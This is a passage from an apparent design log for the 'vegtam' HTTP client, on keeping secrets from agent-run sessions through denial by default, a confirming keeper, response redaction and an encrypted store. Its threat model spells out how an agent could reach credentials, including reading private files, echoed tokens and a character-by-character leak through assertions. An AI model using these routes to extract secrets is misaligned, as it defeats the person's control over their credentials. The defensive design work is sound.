  program runs. The next step is a keeper, a process of the person's
  that holds the secrets and asks before a use, as `ssh-agent -c` does
  for keys, so that `vegtam run` under an agent never sees them. The
  core keeps substitution, origins and the check behind one interface,
  `core.Secrets` (`SecretValue` and `SecretOrigins`), for the keeper to
  take its place.

## 2026-10-24: without a person, no secrets

- **The threat.** Origins say where a secret may go, not who may use
  it. An agent runs in the person's shell, as the same user: it reads
  `http-client.private.env.json` and the environment, runs what a
  command file runs, and what vegtam prints of a response, a token from
  a sign-in among it, lands in its context and its history. Masking is
  a property of what vegtam prints, and keeps nothing from a process
  that can read the files. The answer is to keep the values away from
  such a run, not to trust it with them.
- **None by default.** A run without a person, in the sense of the
  modes, gets no secret value: a request that needs one, of any kind,
  anywhere in it, is an error of kind `policy`, exit code 6, in a dry
  run too. `--confirm` does not lift it: the program that passes it is
  the one the rule is for. The error names the first secret, and
  `person_command` the command a person runs at a terminal to send the
  request, with the run's ref and `-e`, and `--confirm=<ref>` for an
  `@note`. The strict value is the default because the safe setup must
  be the one a person gets without reading anything: on a laptop, the
  agent and the person are one user.
- **Weakened by the policy alone.** `secrets.unattended: "keeper"` sends
  such requests through the keeper instead, and
  `secrets.keeper_asks: "unbound"` lets it skip its question for a
  request whose secrets are all bound where it goes. No flag, variable
  or file can say either: whoever writes the arguments, the environment
  or a `.http` file is what the rule is for.
- **Held, not hidden.** Such a run holds no value to begin with, rather
  than holding one and refusing to send it. It reads the private file's
  names and `$allow` and not its values: the file is decoded into raw
  bytes, each checked to be a string, a number or a boolean, and every
  byte zeroed; no Go string is made of a value. It reads no
  `{{$env NAME}}`, which is a secret by its name whether set or not, and
  runs no `{{$cmd NAME}}`, though it still checks that the command file
  is trusted, as a dry run does, so that a dry run says what a run
  would. The session asks the secrets of a request for no value either:
  where it would, to learn where a request goes, the value is
  `core.ErrHeld`, which is `ErrLate` too, so a URL whose host is a
  secret goes to an origin not known before it is sent. A value that a
  `# @capture` takes from a response the run keeps as it came, and does
  not send.
- **What it cannot mask.** A run that holds no value cannot hide one
  that a file writes out: the text of an `@note`, or the hosts of
  `$allow`, show as written. The program can read those files anyway.
- **Before the confirmation.** Without a person, resolving a request
  reads no secret and runs no command, so the session resolves it
  before it asks for `--confirm`: a request that needs a secret value
  says so first, whatever confirms it.
- **A sterile response.** A response hands out credentials that vegtam
  does not know as secrets until something captures them: a session
  cookie, a token in the body of a sign-in, a JWT in a redirect. A run
  without a person is shown none of them, whether its own requests held
  a secret or not: the values of `Set-Cookie`, `Authorization`,
  `Proxy-Authorization` and `WWW-Authenticate`, and of a header that,
  after an `X-`, is named as a credential is; in a JSON body, the value
  of each member named `token`, `access_token`, `refresh_token`,
  `id_token`, `secret`, `client_secret`, `password`, `passwd`,
  `api_key`, `apikey`, `session`, `sessionid`, `cookie`, `authorization`
  or `private_key`, in any case and with `-`, `_` or neither, whatever
  its type, but `null` and `""`; a string anywhere shaped as a JWT; the
  same fields of a form, the same parameters of a redirect's
  `Location`, and the `actual` of an assertion on any of them. Each is
  `***`, and `redacted` says where; the history marks the entry. The
  scanner works on the bytes, so the rest of the body stays as the
  server wrote it, and it reads a body cut off at `--max-body` as far as
  it goes. Cookies still go into the jar and back to their server. A
  person's run is shown the response as it came: it is theirs.
- **Assertions on what it is shown.** An assertion says passed or failed,
  and that is a bit of what it looked at: `body contains "a"`, `"b"`,
  and so on, would read a token that a server echoes, or one that a
  response hands out, a character at a time, a few dozen assertions to a
  request. So a run without a person checks its assertions against the
  response as it is shown it, masked and sterile; its captures take their
  values from the response as it came, which they must send on. A
  `plain` capture of such a credential, by the name of its member or
  header, in a JSON value that holds one, or as a JWT, is a secret all
  the same: as plain text, the requests after it would show it, and send
  it anywhere.
- **By name, and so not all.** Names are a guess: a token under
  `"t"` passes, and a field named `session` that holds a user's name is
  hidden. The list is short and common on purpose; a value that vegtam
  knows is masked by value as well. Whatever passes, the run cannot
  send it anywhere a secret could go: it holds no secret to send with
  it, and the keeper checks where the values it holds go.
- **The keeper is behind an interface.** `session.Options.Keeper` takes
  the requests of a run without a person that need a value; nil, as
  `"deny"` has it, refuses them. Once a request prepared in a run needs
  the keeper, every request of the run goes through it, so that the
  cookies and the captures of its responses, which stay in the keeper,
  go with the requests after them; a run prepares all its requests
  before it sends the first. The keeper's side of it is
  `Session.Relay`, which sends a request as `Run` does, with the values
  it holds; the tests use one in their own process.
- **`vegtam doctor`.** A person who lets an agent into their shell
  should see what it can reach: the private file of the directory, the
  environment variables the policy binds that are set, the keeper's
  socket, a multiplexer that another process can type into, and the
  modes of the configuration. It reads no secret value, and exits with
  0: it is a diagnosis.

## 2026-10-24: a store of secrets

- **A file of the person's, encrypted.** The keeper needs values that no
  program of the same user can read from a file: `secrets.enc` in
  vegtam's configuration directory, mode 0600 in a directory of 0700,
  refused if another user owns it or others can read or write it. Its
  values are sealed with XChaCha20-Poly1305 under a key that Argon2id
  derives from a password (3 passes, 64 MiB, 4 lanes: RFC 9106's second
  recommendation), with a random 24-byte nonce for each save, so that
  nothing needs a counter. The format has a version, and a file that asks
  for parameters outside sane bounds is refused before anything is
  derived: a file made up must not make vegtam allocate gigabytes.
- **Names and origins in the clear.** They are no secret: a `.http` file
  holds the names, and a private environment file holds the origins in
  `$allow`. In the clear, a run without a person knows which placeholders
  are secrets of the store and where each may go, without the password,
  and `vegtam secret list` needs none. The seal covers them as additional
  data, each field as a netstring, so that changing one fails as a wrong
  password does; the netstrings, not JSON, so that no change of a JSON
  encoder changes the bytes.
- **The password is typed.** At the controlling terminal, without echo;
  never from a flag, a variable or a file, which a program could pass.
  A new store asks for it twice. A run asks for it once, when it first
  needs a value of the store, and a dry run never. The terminal interface
  owns the terminal once it runs, so it asks before it starts, if there
  is a store; enter alone goes without it.
- **The file first, then the store.** A `{{name}}` takes, in order: a
  value a capture took; a value of the private environment file beside
  the requests; a value of the store; a value of the public file. The
  private file is nearer the requests, and a person who keeps one there
  means it; when both hold a name, a warning says that the file's value
  is used, with its `$allow`. A secret of either beats the public file's
  value of the same name, which a cloned repository may write. The
  keeper reads the store alone, and no private file: a program could
  put one where the keeper would look.
- **Flat, by name.** The store has no environments: one value for each
  name. `vegtam secret import -e dev` takes those of `$shared` and of one
  environment; a person who needs two tokens of one name for two
  environments names them apart. Environments in the store would ask the
  keeper which one a run means, and that is the run's to say, which the
  keeper must not trust.
- **The header, proved by the password.** A person's run decides where
  each secret of the store may go from the header, read when the run
  begins, before it asks for the password; another process could change
  the header for that run, and put the file back while the person types.
  So once the password opens the store, the run compares what it holds
  with what the header said, and refuses the store if they differ.
- **No lock between processes.** Two writers of the store, a person's
  `vegtam secret` while another runs, keep the last one's file; each
  writes it whole and atomically.
